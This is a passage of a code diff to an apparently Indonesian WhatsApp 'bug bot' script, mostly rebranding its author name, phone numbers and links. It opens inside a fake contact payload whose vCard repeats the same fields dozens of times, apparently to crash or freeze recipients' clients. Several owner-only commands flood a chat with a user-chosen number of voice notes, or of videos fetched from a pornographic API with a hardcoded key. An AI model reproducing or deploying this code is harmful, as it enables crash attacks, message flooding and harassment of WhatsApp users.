karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
+ const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
 haikal.sendContact(m.chat, global.ownerr, fkontaak)
 }
 }
@@ -1223,7 +1223,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
 haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted: doc })
@@ -1260,7 +1260,7 @@ let buttonsntnsfww = [
 await haikal.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
 \n\n*WELCOME\n\n
 bugcrot
-bugahay `, `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎${ngazap(prefix)}`, m)
+bugahay `, `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦${ngazap(prefix)}`, m)
 }
 }
 break
@@ -1275,7 +1275,7 @@ if (!AntiNsfww) return m.reply(mess.nsfw)
  ]
 let button3Messagess = {
 image: {url:waifudd.data.url},
-caption:`寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+caption:`v`,
 buttons: bugcrotbot,
 headerType: 1
 } 
@@ -1295,7 +1295,7 @@ m.reply(mess.wait)
  ]
 let button4Messagess = {
 image: {url:waifudd.data.url},
-caption:`寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+caption:`𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,
 buttons: bugahaybot,
 headerType: 1
 } 
@@ -1378,7 +1378,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  mem = fs.readFileSync('./baseikal/sound/tes.mp3')
  haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1391,7 +1391,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  mom = fs.readFileSync('./baseikal/sound/ketawa.mp3')
  haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1399,12 +1399,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dioha': {
+case 'satrianyha': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  mim = fs.readFileSync('./baseikal/sound/ketawa.mp3')
  haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1412,12 +1412,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'diohe': {
+case 'satrianyhe': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  mum = fs.readFileSync('./baseikal/sound/awkwk.mp3')
  haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1425,12 +1425,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dioba': {
+case 'satrianyba': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  ah = fs.readFileSync('./baseikal/sound/bang.mp3')
  haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1438,12 +1438,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'diobe': {
+case 'satrianybe': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  eh = fs.readFileSync('./baseikal/sound/nob.mp3')
  haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1451,12 +1451,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'diobu': {
+case 'satrianybu': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  ih = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1464,12 +1464,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'diobi': {
+case 'satrianybi': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  nyong = fs.readFileSync('./baseikal/sound/mastah.mp3')
  haikal.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1477,12 +1477,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dioca': {
+case 'satrianyca': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  ri = fs.readFileSync('./baseikal/sound/ikehcok.mp3')
  haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1490,12 +1490,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dioci': {
+case 'satrianyci': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  ru = fs.readFileSync('./baseikal/sound/loli.mp3')
  haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1503,12 +1503,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'diocu': {
+case 'satrianycu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  re = fs.readFileSync('./baseikal/sound/kesel.mp3')
  haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -1516,12 +1516,12 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case 'dioco': {
+case 'satrianyco': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  ro = fs.readFileSync('./baseikal/sound/ngeselin.mp3')
  haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
@@ -2132,7 +2132,7 @@ break
 //=================================================//
 case 'sc': {
 if (isBan) throw sticBanLu(from)
-reply('wa.me/6282264181831\n\n Sc Bot : https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA')
+reply('wa.me/17077706888\n\n Sc Bot : https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg')
 }
 break
 //=================================================//
@@ -2181,7 +2181,7 @@ const result4 = `*DOWNLOAD MEDIAFIRE*
 *Link* : ${baby1[0].link}\n
 _whoa wait zimbot processing..._
 
